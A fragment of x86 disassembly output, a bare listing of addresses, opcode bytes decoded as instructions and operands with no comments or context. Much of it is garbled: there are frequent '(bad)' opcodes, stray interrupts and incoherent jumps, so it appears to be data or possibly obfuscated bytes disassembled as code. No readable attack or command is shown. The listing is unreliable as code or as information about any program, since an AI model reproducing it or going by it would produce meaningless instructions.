  42304a:	add    BYTE PTR [eax],al
  42304c:	push   cs
  42304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304e:	aad    0x49
  423050:	leave  
  423051:	push   es
  423052:	xor    al,0x0
  423054:	add    BYTE PTR [eax],al
  423056:	push   edi
  423057:	xor    eax,0x6c9ab13
  42305c:	cmp    al,0x0
  42305e:	add    BYTE PTR [eax],al
  423060:	mov    ds:0x79c335c1,eax
  423065:	push   es
  423066:	inc    esp
  423067:	add    BYTE PTR [eax],al
  423069:	add    BYTE PTR [eax],bl
  42306b:	iret   
  42306c:	addr16 inc esi
  42306e:	add    BYTE PTR [eax],al
  423070:	add    BYTE PTR [edi-0x32be5048],ch
  423076:	jbe    0x423000
  423078:	int    0x1
  42307a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423080:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423087:	int    0x76
  423089:	mov    ch,cl
  42308b:	add    DWORD PTR [ebp-0x7f],edi
  42308e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423095:	mov    dl,0x35
  423097:	leave  
  423098:	jbe    0x42309f
  42309a:	mov    bh,0x3f
  42309c:	cmp    DWORD PTR [edi-0x48],eax
  42309f:	leave  
  4230a0:	jbe    0x4230ab
  4230a2:	xlat   BYTE PTR ds:[ebx]
  4230a3:	sbb    cl,cl
  4230a5:	push   es
  4230a6:	les    eax,FWORD PTR [eax]
  4230a8:	add    BYTE PTR [eax],al
  4230aa:	push   cs
  4230ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ac:	aad    0x49
  4230ae:	leave  
  4230af:	push   es
  4230b0:	nop
  4230b1:	add    BYTE PTR [eax],al
  4230b3:	add    BYTE PTR [edi+0x35],dl
  4230b6:	xlat   BYTE PTR ds:[ebx]
  4230b7:	inc    ecx
  4230b8:	leave  
  4230b9:	push   es
  4230ba:	aam    0x0
  4230bc:	add    BYTE PTR [eax],al
  4230be:	cmp    DWORD PTR [ecx+0x57],ecx
  4230c1:	jge    0x42308c
  4230c3:	push   es
  4230c4:	fadd   QWORD PTR [eax]
  4230c6:	add    BYTE PTR [eax],al
  4230c8:	mov    cl,0x3f
  4230ca:	shl    DWORD PTR ds:0xe406c9,0x0
  4230d1:	add    BYTE PTR [edi-0x49],al
  4230d4:	xlat   BYTE PTR ds:[ebx]
  4230d5:	sbb    cl,cl
  4230d7:	push   es
  4230d8:	pushf  
  4230d9:	add    BYTE PTR [eax],al
  4230db:	add    BYTE PTR [esi],cl
  4230dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230de:	aad    0x49
  4230e0:	leave  
  4230e1:	push   es
  4230e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230e3:	add    BYTE PTR [eax],al
  4230e5:	add    BYTE PTR [edi+0x35],dl
  4230e8:	xlat   BYTE PTR ds:[ebx]
  4230e9:	inc    ecx
  4230ea:	leave  
  4230eb:	push   es
  4230ec:	lods   al,BYTE PTR ds:[esi]
  4230ed:	add    BYTE PTR [eax],al
  4230ef:	add    BYTE PTR [ecx],bh
  4230f1:	dec    ecx
  4230f2:	push   edi
  4230f3:	jge    0x4230be
  4230f5:	push   es
  4230f6:	mov    ah,0x0
  4230f8:	add    BYTE PTR [eax],al
  4230fa:	mov    cl,0x3f
  4230fc:	shl    DWORD PTR ds:0xbc06c9,0x0
  423103:	add    BYTE PTR [edi-0x49],al
  423106:	ret    
  423107:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42310d:	jo     0x4230dc
  42310f:	jbe    0x423146
  423111:	add    BYTE PTR [eax],dh
  423113:	int    0x76
  423115:	stc    
  423116:	int    0x8d
  423118:	stc    
  423119:	cmp    eax,ebp
  42311b:	cmp    ecx,DWORD PTR [edi]
  42311d:	shl    edx,cl
  42311f:	sub    bl,dl
  423121:	mov    ebp,0xcdd35392
  423126:	lea    ebp,[ebp+0x52fd343]
  42312c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  423133:	int    0x8d
  423135:	mov    ch,0x3b
  423137:	lds    edi,FWORD PTR [ebx]
  423139:	psrlq  mm6,mm2
  42313c:	sub    bl,dl
  42313e:	mov    ebp,0xcdd35392
  423143:	lea    ebp,[ebp+0x76cd7d33]
  423149:	ins    DWORD PTR es:[edi],dx
  42314a:	inc    ebx
  42314b:	shr    DWORD PTR [edi],cl
  42314d:	or     ch,dl
  42314f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423159:	int    0x76
  42315b:	mov    ch,cl
  42315d:	rcl    BYTE PTR [ecx],1
  42315f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423169:	add    DWORD PTR [ebp-0x7f],esi
  42316c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423173:	jo     0x423175
  423175:	cwde   
  423176:	xor    ch,cl
  423178:	lea    ecx,[eax-0x7ebaf533]
  42317e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423185:	int    0x5d
  423187:	adc    DWORD PTR [ecx-0x29327f80],eax
  42318d:	mov    BYTE PTR [ebx],bh
  42318f:	ins    DWORD PTR es:[edi],dx
  423190:	iret   
  423191:	pop    ss
  423192:	pushf  
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42319b:	jo     0x42316a
  42319d:	jbe    0x423127
  42319f:	int    0x1
  4231a1:	inc    ebp
  4231a2:	add    DWORD PTR [eax+0x500080],0x760a889a
  4231ac:	adc    eax,0xcd8876cd
  4231b1:	pop    ebp
  4231b2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231b8:	mov    BYTE PTR [ebx],bh
  4231ba:	ins    DWORD PTR es:[edi],dx
  4231bb:	iret   
  4231bc:	pop    ss
  4231bd:	les    eax,FWORD PTR [eax]
  4231bf:	add    BYTE PTR [eax],al
  4231c1:	mov    ebp,0x80803ad9
  4231c6:	jo     0x423195
  4231c8:	jbe    0x423152
  4231ca:	int    0x1
  4231cc:	inc    ebp
  4231cd:	add    DWORD PTR [eax+0x500080],0x76cd889a
  4231d7:	mov    ch,cl
  4231d9:	pop    ebp
  4231da:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231e0:	mov    BYTE PTR [ebx],bh
  4231e2:	ins    DWORD PTR es:[edi],dx
  4231e3:	iret   
  4231e4:	pop    ss
  4231e5:	push   esp
  4231e6:	add    BYTE PTR [eax],al
  4231e8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231ee:	jo     0x4231bd
  4231f0:	jbe    0x42317a
  4231f2:	int    0x1
  4231f4:	inc    ebp
  4231f5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231ff:	pop    ebp
  423200:	or     BYTE PTR [edx],0x76
  423203:	xor    eax,0xc05d76cd
  423208:	push   ds
  423209:	cmp    ebx,edx
  42320b:	sahf   
  42320c:	clc    
  42320d:	add    al,BYTE PTR [ecx]
  42320f:	shr    BYTE PTR [esi+0x2f],cl
  423212:	pop    ecx
  423213:	shl    BYTE PTR [eax+0x0],cl
  423216:	xchg   esi,eax
  423217:	xor    eax,0x43d66d06
  42321c:	int    0x76
  42321e:	pop    ebp
  42321f:	add    al,0xad
  423221:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423228:	adc    eax,0x40d46d06
  42322d:	int    0x76
  42322f:	mov    ch,cl
  423231:	pop    ebp
  423232:	adc    DWORD PTR [ecx-0x29327f80],eax
  423238:	mov    BYTE PTR [ebx],bh
  42323a:	ins    DWORD PTR es:[edi],dx
  42323b:	iret   
  42323c:	xchg   esi,eax
  42323d:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423243:	jo     0x423212
  423245:	jbe    0x4231cf
  423247:	int    0x1
  423249:	cmp    eax,0x808081
  42324e:	push   eax
  42324f:	add    BYTE PTR [edx+0xd760a88],bl
  423255:	in     al,dx
  423256:	test   BYTE PTR [esi+esi*4],al
  423259:	or     eax,0x5d760080
  42325e:	add    al,0xe6
  423260:	pop    ebp
  423261:	sub    al,0x82
  423263:	sub    eax,0xcdb576cd
  423268:	lea    esi,[ebp-0x3f772933]
  42326e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423274:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42327a:	push   ebx
  42327b:	ror    edi,cl
  42327d:	pop    ss
  42327e:	cmc    
  42327f:	inc    DWORD PTR [eax]
  423281:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423287:	jo     0x423256
  423289:	jbe    0x423284
  42328b:	int    0x8d
  42328d:	stc    
  42328e:	int    0xd6
  423290:	mov    BYTE PTR [ebx],bh
  423292:	lds    edi,FWORD PTR [ebx]
  423294:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42329b:	push   ebx
  42329c:	ror    edi,cl
  42329e:	pop    ss
  42329f:	xchg   ebp,eax
  4232a0:	inc    DWORD PTR [eax]
  4232a2:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  4232a8:	jo     0x4232aa
  4232aa:	xchg   esi,eax
  4232ab:	or     eax,0xcdf98dcd
  4232b0:	xchg   esi,eax
  4232b1:	stc    
  4232b2:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4232b5:	(bad)  
  4232b7:	jmp    0x42324b
  4232b9:	shr    edx,cl
  4232bb:	sub    BYTE PTR [ebx+0x13],dl
  4232be:	inc    ebx
  4232bf:	jge    0x423297
  4232c1:	mov    ecx,ecx
  4232c3:	jbe    0x423302
  4232c5:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  4232cf:	cmp    eax,ebp
  4232d1:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  4232d7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4232db:	xchg   DWORD PTR [esi+0x6d],esi
  4232de:	or     dh,BYTE PTR [esi+0x6d]
  4232e1:	int    0x76
  4232e3:	cmp    eax,0x1cd46d06
  4232e8:	int    0x76
  4232ea:	mov    ch,0xcd
  4232ec:	lea    esi,[ebp-0xfc43ac5]
  4232f2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232f8:	push   ebx
  4232f9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232ff:	xchg   ebp,eax
  423300:	int    0x76
  423302:	mov    ch,0xcd
  423304:	lea    esi,[ebp-0xfc43ac5]
  42330a:	shl    edx,cl
  42330c:	sub    bl,dl
  42330e:	mov    ebp,0xcdd35392
  423313:	lea    ebp,[ebp+0x76cd7d33]
  423319:	ins    DWORD PTR es:[edi],dx
  42331a:	inc    ebx
  42331b:	shr    DWORD PTR [edi],cl
  42331d:	pop    es
  42331e:	push   eax
  42331f:	inc    DWORD PTR [eax]
  423321:	add    al,al
  423323:	jmp    FWORD PTR [eax-0x326a8933]
  423329:	lea    ebp,[ebp+0x43]
  42332c:	jge    0x423304
  42332e:	xor    DWORD PTR [eax],eax
  423330:	(bad)  
  423331:	mov    bh,cl
  423333:	jbe    0x423332
  423335:	jo     0x4232f4
  423337:	stc    
  423338:	jl     0x4232ba
  42333a:	or     BYTE PTR [edx],0x76
  42333d:	jne    0x42332b
  42333f:	sbb    cl,ch
  423341:	jbe    0x4233b8
  423343:	int    0x8d
  423345:	mov    ch,0xcd
  423347:	xchg   esi,eax
  423348:	mov    ch,0x3b
  42334a:	or     al,0x3b
  42334c:	cdq    
  42334d:	shr    ebx,cl
  42334f:	xchg   edx,eax
  423350:	shr    edx,cl
  423352:	sub    BYTE PTR [ebx+0x13],dl
  423355:	push   ecx
  423356:	mov    ch,cl
  423358:	jbe    0x423353
  42335a:	int    0x8d
  42335c:	stc    
  42335d:	cmp    eax,ebp
  42335f:	cmp    ecx,DWORD PTR [edi]
  423361:	shl    edx,cl
  423363:	sub    bl,dl
  423365:	mov    ebp,0xcdd35392
  42336a:	lea    esi,[ebp+0x43]
  42336d:	shr    DWORD PTR [edi],cl
  42336f:	add    eax,0x80805300
  423374:	int    0x76
  423376:	stc    
  423377:	int    0x8d
  423379:	stc    
  42337a:	cmp    eax,ebp
  42337c:	cmp    ecx,DWORD PTR [edi]
  42337e:	shl    edx,cl
  423380:	sub    bl,dl
  423382:	mov    ebp,0xcdd35392
  423387:	(bad)  
  423388:	std    
  423389:	inc    ebx
  42338a:	shr    DWORD PTR [edi],cl
  42338c:	add    eax,0x808053ea
  423391:	int    0x76
  423393:	stc    
  423394:	int    0x8d
  423396:	stc    
  423397:	cmp    eax,ebp
  423399:	cmp    ecx,DWORD PTR [edi]
  42339b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233a1:	push   ebx
  4233a2:	shr    esp,cl
  4233a4:	adc    al,0xcd
  4233a6:	lea    esi,[ebp+0x3bb596cd]
  4233ac:	or     al,0x3b
  4233ae:	cdq    
  4233af:	shr    ebx,cl
  4233b1:	xchg   edx,eax
  4233b2:	shr    edx,cl
  4233b4:	sub    BYTE PTR [ebx+0x13],dl
  4233b7:	xchg   ebx,edx
  4233b9:	int    0x8d
  4233bb:	std    
  4233bc:	inc    ebx
  4233bd:	rol    DWORD PTR [edx-0x2893219],cl
  4233c3:	or     dh,BYTE PTR [esi-0x53]
  4233c6:	int    0x76
  4233c8:	jne    0x4233d4
  4233ca:	jbe    0x42339c
  4233cc:	ret    
  4233cd:	dec    ecx
  4233ce:	and    DWORD PTR [esi+0x45e60a35],eax
  4233d4:	leave  
  4233d5:	jbe    0x423374
  4233d7:	inc    ecx
  4233d8:	and    DWORD PTR [esi+0x4576cd35],eax
  4233de:	int    0x8d
  4233e0:	inc    ebp
  4233e1:	cmp    eax,ebp
  4233e3:	cmp    ecx,DWORD PTR [edi]
  4233e5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233eb:	push   ebx
  4233ec:	ror    DWORD PTR [edx],cl
  4233ee:	jbe    0x423445
  4233f0:	int    0x76
  4233f2:	inc    ebp
  4233f3:	int    0x8d
  4233f5:	inc    ebp
  4233f6:	cmp    eax,ebp
  4233f8:	cmp    ecx,DWORD PTR [edi]
  4233fa:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423400:	push   ebx
  423401:	ror    DWORD PTR [edx],cl
  423403:	jbe    0x42339a
  423405:	leave  
  423406:	jbe    0x423445
  423408:	dec    eax
  423409:	and    DWORD PTR [esi+0x1d76c935],eax
  42340f:	ret    0x8621
  423412:	xor    eax,0xcd4576cd
  423417:	lea    eax,[ebp+0x3b]
  42341a:	lds    edi,FWORD PTR [ebx]
  42341c:	psrlq  mm6,mm2
  42341f:	sub    bl,dl
  423421:	mov    ebp,0xcdd35392
  423426:	lea    ebp,[ebp+0x52f7d43]
  42342c:	push   ss
  42342d:	xchg   DWORD PTR [eax-0x6d241480],eax
  423433:	add    BYTE PTR [eax-0x32c27233],0x76
  42343a:	cmp    eax,0x3b5596cd
  42343f:	jns    0x42347c
  423441:	or     al,0xd3
  423443:	lods   eax,DWORD PTR ds:[esi]
  423444:	sub    bl,dl
  423446:	jmp    0x4233da
  423448:	push   ebx
  423449:	jge    0x423418
  42344b:	jbe    0x4233fa
  42344d:	xor    edx,edx
  42344f:	cmp    ebx,edx
  423451:	clc    
  423452:	add    cl,BYTE PTR [edx]
  423454:	jbe    0x4233eb
  423456:	int    0x76
  423458:	sbb    eax,0x3b1d8dcd
  42345d:	lds    edi,FWORD PTR [ebx]
  42345f:	psrlq  mm6,mm2
  423462:	sub    bl,dl
  423464:	mov    ebp,0xcdd35392
  423469:	lea    edx,[ebp+0x16d87d43]
  42346f:	int    0x76
  423471:	sbb    eax,0x3b1d8dcd
  423476:	lds    edi,FWORD PTR [ebx]
  423478:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42347f:	push   ebx
  423480:	ror    DWORD PTR [edx],cl
  423482:	jbe    0x423419
  423484:	int    0x76
  423486:	cmp    eax,0x3b3d8dcd
  42348b:	lds    edi,FWORD PTR [ebx]
  42348d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423494:	push   ebx
  423495:	ror    ebp,cl
  423497:	lea    edx,[ebp+0xad3d12f]
  42349d:	jbe    0x423434
  42349f:	int    0x76
  4234a1:	inc    ebp
  4234a2:	int    0x8d
  4234a4:	inc    ebp
  4234a5:	cmp    eax,ebp
  4234a7:	cmp    ecx,DWORD PTR [edi]
  4234a9:	shl    edx,cl
  4234ab:	sub    bl,dl
  4234ad:	mov    ebp,0xcdd35392
  4234b2:	lea    edx,[ebp+0x52f7d43]
  4234b8:	pusha  
  4234b9:	xchg   edx,eax
  4234ba:	add    BYTE PTR [eax+0xa9576cd],0x76
  4234c1:	or     eax,0x875576cd
  4234c6:	jbe    0x423498
  4234c8:	or     ah,dh
  4234ca:	xchg   ebp,eax
  4234cb:	or     dh,BYTE PTR [esi+0x6d]
  4234ce:	pop    ebp
  4234cf:	inc    ecx
  4234d0:	and    DWORD PTR [esi+0x5d760a35],eax
  4234d6:	leave  
  4234d7:	jbe    0x4234ee
  4234d9:	cmp    DWORD PTR [ecx],esp
  4234db:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234e1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234e7:	int    0x76
  4234e9:	xchg   ebp,eax
  4234ea:	int    0x8d
  4234ec:	xchg   ebp,eax
  4234ed:	cmp    eax,ebp
  4234ef:	cmp    ecx,DWORD PTR [edi]
  4234f1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234f7:	push   ebx
  4234f8:	ror    DWORD PTR [edx],cl
  4234fa:	jbe    0x423579
  4234fc:	int    0x6d
  4234fe:	jmp    0x423506
  423500:	add    DWORD PTR [eax-0x36923280],0x7006
  42350a:	add    BYTE PTR [ebx],cl
  42350c:	and    DWORD PTR [esi-0x369232cb],eax
  423512:	push   es
  423513:	xchg   esp,eax
  423514:	add    BYTE PTR [eax],al
  423516:	add    bh,dh
  423518:	and    DWORD PTR [esi-0x329232cb],eax
  42351e:	ins    DWORD PTR es:[edi],dx
  42351f:	int    0x76
  423521:	icebp  
  423522:	int    0x8d
  423524:	icebp  
  423525:	cmp    eax,ebp
  423527:	cmp    ecx,DWORD PTR [edi]
  423529:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42352f:	push   ebx
  423530:	ror    ebp,cl
  423532:	lea    edi,[ebp+0x2f]
  423535:	rcl    ebx,1
  423537:	int    0x8d
  423539:	ins    DWORD PTR es:[edi],dx
  42353a:	retf   0x8884
  42353d:	or     DWORD PTR [esi-0x57],esi
  423540:	int    0x6d
  423542:	int    0x76
  423544:	icebp  
  423545:	int    0x8d
  423547:	icebp  
  423548:	cmp    ecx,DWORD PTR [edi]
  42354a:	cmp    eax,ebp
  42354c:	shl    edx,cl
  42354e:	sub    bl,dl
  423550:	mov    ebp,0xcdd35392
  423555:	lea    edi,[ebp+0x2f]
  423558:	rcl    ebx,1
  42355a:	int    0x8d
  42355c:	adc    eax,0x3b1596cd
  423561:	or     al,0x3b
  423563:	cdq    
  423564:	shr    ebx,cl
  423566:	xchg   edx,eax
  423567:	shr    edx,cl
  423569:	sub    BYTE PTR [ebx+0x13],dl
  42356c:	xchg   ebx,edx
  42356e:	int    0x8d
  423570:	ins    DWORD PTR es:[edi],dx
  423571:	das    
  423572:	pop    ecx
  423573:	dec    esp
  423574:	mov    ch,cl
  423576:	push   es
  423577:	jo     0x423579
  423579:	add    BYTE PTR [eax],al
  42357b:	int    0x17
  42357d:	jo     0x42357f
  42357f:	add    BYTE PTR [eax],al
  423581:	cmp    eax,ebp
  423583:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423589:	jmp    0x2fd3:0x87d25328
  423590:	pop    ecx
  423591:	lea    ebp,[ecx-0x72f682c5]
  423597:	test   eax,0x76ca6dcd
  42359c:	test   eax,0xcdf18dcd
  4235a1:	xchg   esi,eax
  4235a2:	icebp  
  4235a3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235a6:	cdq    
  4235a7:	shr    edx,cl
  4235a9:	sub    bl,dl
  4235ab:	jmp    0x42353f
  4235ad:	push   ebx
  4235ae:	adc    ecx,ebp
  4235b0:	xchg   esi,eax
  4235b1:	jge    0x4235e2
  4235b3:	rcl    DWORD PTR [ebx],1
  4235b5:	int    0x96
  4235b7:	ins    DWORD PTR es:[edi],dx
  4235b8:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235bf:	icebp  
  4235c0:	int    0x8d
  4235c2:	icebp  
  4235c3:	cmp    eax,ebp
  4235c5:	cmp    ecx,DWORD PTR [edi]
  4235c7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4235cd:	push   ebx
  4235ce:	ror    ebp,cl
  4235d0:	lea    edi,[ebp+0x2f]
  4235d3:	rcl    ebx,1
  4235d5:	int    0x8d
  4235d7:	ins    DWORD PTR es:[edi],dx
  4235d8:	retf   0x8884
  4235db:	or     DWORD PTR [esi-0x57],esi
  4235de:	int    0x6d
  4235e0:	int    0x76
  4235e2:	icebp  
  4235e3:	int    0x8d
  4235e5:	icebp  
  4235e6:	cmp    eax,ebp
  4235e8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235ee:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235f2:	int    0x8d
  4235f4:	jge    0x423625
  4235f6:	rcl    ebx,1
  4235f8:	int    0x8d
  4235fa:	pop    ebp
  4235fb:	int    0x96
  4235fd:	pop    ebp
  4235fe:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423601:	cdq    
  423602:	shr    ebx,cl
  423604:	xchg   edx,eax
  423605:	shr    edx,cl
  423607:	sub    BYTE PTR [ebx+0x13],dl
  42360a:	xchg   ebx,edx
  42360c:	int    0x8d
  42360e:	ins    DWORD PTR es:[edi],dx
  42360f:	das    
  423610:	pop    ecx
  423611:	dec    esp
  423612:	mov    ch,cl
  423614:	push   es
  423615:	xchg   esp,eax
  423616:	add    BYTE PTR [eax],al
  423618:	add    ch,cl
  42361a:	pop    ss
  42361b:	xchg   esp,eax
  42361c:	add    BYTE PTR [eax],al
  42361e:	add    BYTE PTR [ebx],bh
  423620:	lds    edi,FWORD PTR [ebx]
  423622:	cdq    
  423623:	sar    DWORD PTR [ebp+0x28ead392],cl
  423629:	push   ebx
  42362a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423630:	test   eax,0x8d097d3b
  423635:	test   eax,0x76ca6dcd
  42363a:	test   eax,0xcdf18dcd
  42363f:	xchg   esi,eax
  423640:	icebp  
  423641:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423644:	cdq    
  423645:	shr    edx,cl
  423647:	sub    bl,dl
  423649:	jmp    0x4235dd
  42364b:	push   ebx
  42364c:	adc    ecx,ebp
  42364e:	xchg   esi,eax
  42364f:	jge    0x423680
  423651:	rcl    DWORD PTR [ebx],1
  423653:	int    0x96
  423655:	ins    DWORD PTR es:[edi],dx
  423656:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42365d:	xor    eax,0x3b358dcd
  423662:	(bad)  
  423664:	(bad)
  423667:	sub    bl,dl
  423669:	mov    ebp,0xcdd35392
  42366e:	lea    ebx,[ebp-0x33]
  423671:	xchg   esi,eax
  423672:	pop    ebp
  423673:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423676:	cdq    
  423677:	shr    ebx,cl
  423679:	xchg   edx,eax
  42367a:	shr    edx,cl
  42367c:	sub    BYTE PTR [ebx+0x13],dl
  42367f:	das    
  423680:	rcl    ebx,1
  423682:	xchg   DWORD PTR [esi+0x7d],esi
  423685:	or     dh,BYTE PTR [esi+0x7d]
  423688:	int    0x76
  42368a:	jge    0x423659
  42368c:	lea    ecx,ds:0xb2f7d43
  423692:	(bad)  
  423693:	inc    DWORD PTR [eax]
  423695:	add    ch,cl
  423697:	jbe    0x4236f6
  423699:	int    0x8d
  42369b:	pop    ebp
  42369c:	cmp    ecx,DWORD PTR [edi]
  42369e:	shl    edx,cl
  4236a0:	sub    BYTE PTR [ebx],bh
  4236a2:	(bad)
  4236a5:	xchg   edx,eax
  4236a6:	push   ebx
  4236a7:	ror    ebp,cl
  4236a9:	lea    ecx,ds:0xcdd3d12f
  4236af:	lea    edx,[ebp-0x142cf3c5]
  4236b5:	xchg   edx,eax
  4236b6:	push   ebx
  4236b7:	ror    ebp,cl
  4236b9:	lea    edx,[ebp-0xd2cf0c5]
  4236bf:	sub    BYTE PTR [ebx-0x2d],dl
  4236c2:	or     dh,BYTE PTR [esi+0x35]
  4236c5:	int    0x76
  4236c7:	popf   
  4236c8:	int    0x8d
  4236ca:	popf   
  4236cb:	cmp    ecx,DWORD PTR [edi]
  4236cd:	shl    edx,cl
  4236cf:	sub    BYTE PTR [ebx],bh
  4236d1:	(bad)
  4236d4:	xchg   edx,eax
  4236d5:	push   ebx
  4236d6:	ror    ebp,cl
  4236d8:	lea    ebx,[ebp+0x3b9d96cd]
  4236de:	or     al,0xd3
  4236e0:	jmp    0x423674
  4236e2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236e8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236ee:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236f4:	in     al,dx
  4236f5:	sbb    al,0xcd
  4236f7:	jbe    0x423696
  4236f9:	int    0x8d
  4236fb:	popf   
  4236fc:	cmp    eax,ebp
  4236fe:	cmp    ecx,DWORD PTR [edi]
  423700:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423706:	push   ebx
  423707:	rol    DWORD PTR [edi+0x760a5576],cl
  42370d:	push   ebp
  42370e:	int    0x76
  423710:	popf   
  423711:	int    0x8d
  423713:	popf   
  423714:	cmp    eax,ebp
  423716:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42371c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423720:	int    0x8d
  423722:	lods   eax,DWORD PTR ds:[esi]
  423723:	xor    edi,DWORD PTR [ebp-0x33]
  423726:	jbe    0x4236c5
  423728:	int    0x96
  42372a:	popf   
  42372b:	cmp    eax,ebp
  42372d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  423733:	mov    ebp,0xcdd25392
  423738:	xchg   esi,eax
  423739:	push   ebp
  42373a:	das    
  42373b:	rcl    edx,1
  42373d:	inc    ebx
  42373e:	shr    DWORD PTR [edi],cl
  423740:	pop    es
  423741:	adc    ebp,edi
  423743:	add    BYTE PTR [eax],al
  423745:	int    0x76
  423747:	stc    
  423748:	int    0x76
  42374a:	stc    
  42374b:	int    0x76
  42374d:	std    
  42374e:	or     dh,BYTE PTR [esi+0x35]
  423751:	int    0x76
  423753:	mov    ch,cl
  423755:	lea    esp,ds:0x3b2596cd
  42375b:	or     al,0xd3
  42375d:	jmp    0x4236f1
  42375f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423765:	add    BYTE PTR [eax+0x5328ead3],0x13
  42376c:	jno    0x42373b
  42376e:	lea    esp,[ebp-0x33]
  423771:	xchg   esi,eax
  423772:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423776:	cdq    
  423777:	shr    ebx,cl
  423779:	xchg   edx,eax
  42377a:	shr    edx,cl
  42377c:	sub    BYTE PTR [ebx+0x13],dl
  42377f:	jno    0x42374e
  423781:	(bad)  
  423782:	stc    
  423783:	int    0x96
  423785:	stc    
  423786:	add    dh,dl
  423788:	xor    eax,0x993b0c3b
  42378d:	shr    ebx,cl
  42378f:	xchg   edx,eax
  423790:	shr    edx,cl
  423792:	sub    BYTE PTR [ebx+0x13],dl
  423795:	jno    0x423797
  423797:	jo     0x4237ad
  423799:	int    0x8d
  42379b:	stc    
  42379c:	int    0x96
  42379e:	stc    
  42379f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237a2:	cdq    
  4237a3:	shr    ebx,cl
  4237a5:	xchg   edx,eax
  4237a6:	shr    edx,cl
  4237a8:	sub    BYTE PTR [ebx+0x13],dl
  4237ab:	or     dh,BYTE PTR [esi+0x65]
  4237ae:	inc    ebx
  4237af:	jge    0x4237e0
  4237b1:	add    eax,0x808080ab
  4237b6:	int    0x76
  4237b8:	stc    
  4237b9:	in     al,dx
  4237ba:	(bad)  
  4237bb:	int    0x96
  4237bd:	or     dh,BYTE PTR gs:[esi-0x53]
  4237c1:	push   ecx
  4237c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237c3:	lods   eax,DWORD PTR ds:[esi]
  4237c4:	int    0x8d
  4237c6:	lods   eax,DWORD PTR ds:[esi]
  4237c7:	shr    ebx,cl
  4237c9:	xchg   edx,eax
  4237ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4237cd:	lods   eax,DWORD PTR ds:[esi]
  4237ce:	sub    BYTE PTR [ebx-0x2d],dl
  4237d1:	int    0x8d
  4237d3:	jne    0x42379f
  4237d5:	dec    esp
  4237d6:	or     DWORD PTR [ecx],0x8dcd304c
  4237dc:	mov    ch,0xcd
  4237de:	lea    esi,[ebp+0x3bb596cd]
  4237e4:	or     al,0x3b
  4237e6:	cdq    
  4237e7:	shr    edx,cl
  4237e9:	sub    bl,dl
  4237eb:	jmp    0x42377f
  4237ed:	push   ebx
  4237ee:	adc    ecx,ebp
  4237f0:	xchg   esi,eax
  4237f1:	mov    ch,0x87
  4237f3:	jge    0x4237c2
  4237f5:	jbe    0x4237a4
  4237f7:	cmp    edx,ebp
  4237f9:	add    al,0xad
  4237fb:	std    
  4237fc:	add    al,0xea
  4237fe:	std    
  4237ff:	shr    ebx,cl
  423801:	sub    BYTE PTR [edi+0x3bd353d2],al
  423807:	leave  
  423808:	int    0x8d
  42380a:	std    
  42380b:	int    0x96
  42380d:	std    
  42380e:	shr    edx,cl
  423810:	xchg   edx,eax
  423811:	shr    ebx,cl
  423813:	sub    BYTE PTR [ebx-0x1d],dl
  423816:	cmp    ebx,ecx
  423818:	inc    ebx
  423819:	rcl    dh,cl
